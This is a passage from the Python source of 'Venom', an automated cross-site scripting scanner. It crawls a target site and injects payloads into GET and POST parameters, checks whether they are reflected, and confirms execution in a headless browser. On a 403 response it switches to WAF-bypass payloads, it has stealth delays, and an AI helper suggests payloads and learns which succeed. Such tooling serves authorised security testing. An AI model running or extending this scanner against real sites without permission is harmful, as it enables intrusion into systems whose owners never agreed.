                os.unlink(temp_file.name) if method.lower() == 'post' else None
                self.headless_runs += 1
                return True
            except NoAlertPresentException:
                return False
            except TimeoutException:
                logging.warning(f"Timeout during execution verification for {payload}")
                return False
        except WebDriverException as e:
            logging.error(f"Headless verification failed: {e}")
            return False

    def scan_url(self, url: str, method: str, data: Dict[str, str]):
        if url in self.visited_urls:
            return
        self.visited_urls.add(url)
        
        try:
            response = self.session.get(url, timeout=self.args.timeout, verify=True) if method.lower() == 'get' else \
                      self.session.post(url, data=data, timeout=self.args.timeout, verify=True)
            params = self.extract_params(url, response.text)
            if not params and method.lower() == 'post':
                params = list(data.keys())
            
            payloads = self.ai_assistant.suggest_payloads(response.text, status_code=response.status_code) if self.ai_assistant else self.payloads
            
            for param in params:
                for payload in payloads:
                    self.current_payload = payload[:50] + "..." if len(payload) > 50 else payload
                    self.current_param = param
                    self.current_method = method.upper()
                    self.current_cookie = str(self.session.cookies.get_dict())[:50] + "..." if len(str(self.session.cookies.get_dict())) > 50 else str(self.session.cookies.get_dict())
                    resp_text, status = self.inject_payload(url, method, payload, param, data)
                    test_count = self.total_tests.increment()
                    
                    if resp_text and status == 200:
                        soup = BeautifulSoup(resp_text, 'html.parser')
                        if is_reflected(payload, resp_text):
                            executable = is_executable_context(payload, soup)
                            verified = self.verify_execution(url, payload, method, param, data) if self.args.verify_execution and executable else False
                            vuln_type = "Stored XSS" if '<form' in resp_text and payload in resp_text else "Reflected XSS"
                            vuln = {
                                'url': url,
                                'method': method.upper(),
                                'param': param,
                                'payload': payload,
                                'type': vuln_type,
                                'executable': executable,
                                'verified': verified,
                                'response_snippet': resp_text[:200]
                            }
                            self.vulnerabilities.append(vuln)
                            self.payload_generator.update_success(payload)
                            if self.ai_assistant:
                                self.ai_assistant.record_success(payload, resp_text[:500], status)
                            logging.info(f"{GREEN}Vulnerability found: {vuln_type} - {url} - Param: {param} - Payload: {payload}{RESET}")
                    
                    if status == 403 and not self.bypass_performed:
                        self.bypass_performed = True
                        self.payload_generator = PayloadGenerator(self.args.payloads_dir, True, self.use_403_bypass, self.args.stealth)
                        self.payloads = self.payload_generator.generate()
                        logging.info(f"403 detected, switching to bypass payloads: {len(self.payloads)} loaded")
                    
                    time.sleep(random.uniform(self.args.min_delay, self.args.max_delay))
        
        except RequestException as e:
            logging.error(f"Scan failed for {url}: {e}")

    def worker(self):
        while self.running:
            try:
                url, method, data = self.task_queue.get(timeout=1)
                self.scan_url(url, method, data)
                self.task_queue.task_done()
            except queue.Empty:
                break
            except Exception as e:
                logging.error(f"Worker error: {e}")

    def display_status(self):
        while self.running:
            current_time = time.time()
            if current_time - self.last_display_time >= 1 and not self.args.no_live_status:
                elapsed = current_time - self.start_time
                tests_per_sec = self.total_tests.get() / elapsed if elapsed > 0 else 0
                status = f"""
{BLUE}╔════ Venom Live Status @ {time.strftime('%H:%M:%S')} ═════════════════════════════════════╗{RESET}
{BLUE}║{RESET} Tests Run: {YELLOW}{self.total_tests.get():>5}{RESET} | Payloads: {YELLOW}{self.total_payloads}{RESET} | Vulns: {RED}{len(self.vulnerabilities)}{RESET} | Speed: {GREEN}{tests_per_sec:.2f} t/s{RESET}
{BLUE}║{RESET} Current: {CYAN}{self.current_method} {self.current_param}={self.current_payload}{RESET}
{BLUE}║{RESET} Cookies: {WHITE}{self.current_cookie}{RESET}
{BLUE}║{RESET} WAF/IPS: {ORANGE}{self.waf_ips_status}{RESET} | Workers: {PURPLE}{self.args.workers}{RESET} | Domain: {WHITE}{self.domain}{RESET}
{BLUE}╚════════════════════════════════════════════════════════════════════════════════════╝{RESET}
"""
                print(status, end='\r' if os.name == 'nt' else '')
                self.last_display_time = current_time
            time.sleep(0.1)

    def run(self):
        if not self.check_connection(self.args.url):
            print(f"{RED}[!] Target URL {self.args.url} is unreachable. Exiting.{RESET}")
            return
        
        urls = self.crawl_links(self.args.url)
        for url in urls:
            if self.args.method in ['get', 'both']:
                self.task_queue.put((url, 'get', {}))
            if self.args.method in ['post', 'both']:
                self.task_queue.put((url, 'post', self.post_data))

        status_thread = threading.Thread(target=self.display_status)
        status_thread.start()

        with ThreadPoolExecutor(max_workers=self.args.workers) as executor:
            for _ in range(self.args.workers):
                executor.submit(self.worker)

        self.task_queue.join()
        self.running = False
        status_thread.join()

        self.generate_report()

    def generate_report(self):
        print(f"\n{GREEN}╔════ Venom Scan Report @ {time.strftime('%Y-%m-%d %H:%M:%S')} ═════════════════════╗{RESET}")
        print(f"{GREEN}║{RESET} Target: {WHITE}{self.args.url}{RESET}")
        print(f"{GREEN}║{RESET} Total Tests: {YELLOW}{self.total_tests.get()}{RESET} | Payloads: {YELLOW}{self.total_payloads}{RESET} | Duration: {CYAN}{time.time() - self.start_time:.2f}s{RESET}")
        print(f"{GREEN}║{RESET} Vulnerabilities Found: {RED}{len(self.vulnerabilities)}{RESET}")
        if self.vulnerabilities:
            for i, vuln in enumerate(self.vulnerabilities, 1):
                print(f"{GREEN}║{RESET} {i}. {RED}{vuln['type']}{RESET}")
                print(f"{GREEN}║{RESET}    URL: {WHITE}{vuln['url']}{RESET}")
                print(f"{GREEN}║{RESET}    Method: {CYAN}{vuln['method']}{RESET}")
                print(f"{GREEN}║{RESET}    Parameter: {YELLOW}{vuln['param']}{RESET}")
                print(f"{GREEN}║{RESET}    Payload: {PURPLE}{vuln['payload']}{RESET}")
                print(f"{GREEN}║{RESET}    Executable: {GREEN if vuln['executable'] else YELLOW}{'Yes' if vuln['executable'] else 'No'}{RESET}")
                if self.args.verify_execution:
                    print(f"{GREEN}║{RESET}    Verified Execution: {GREEN if vuln['verified'] else RED}{'Yes' if vuln['verified'] else 'No'}{RESET}")
                if self.args.full_report:
                    print(f"{GREEN}║{RESET}    Response Snippet: {WHITE}{vuln['response_snippet']}{RESET}")
        else:
            print(f"{GREEN}║{RESET}    {GREEN}No vulnerabilities detected.{RESET}")
        print(f"{GREEN}╚════════════════════════════════════════════════════════════════════╝{RESET}")

if __name__ == "__main__":
    args = parse_args()
    venom = Venom(args)
    venom.run()
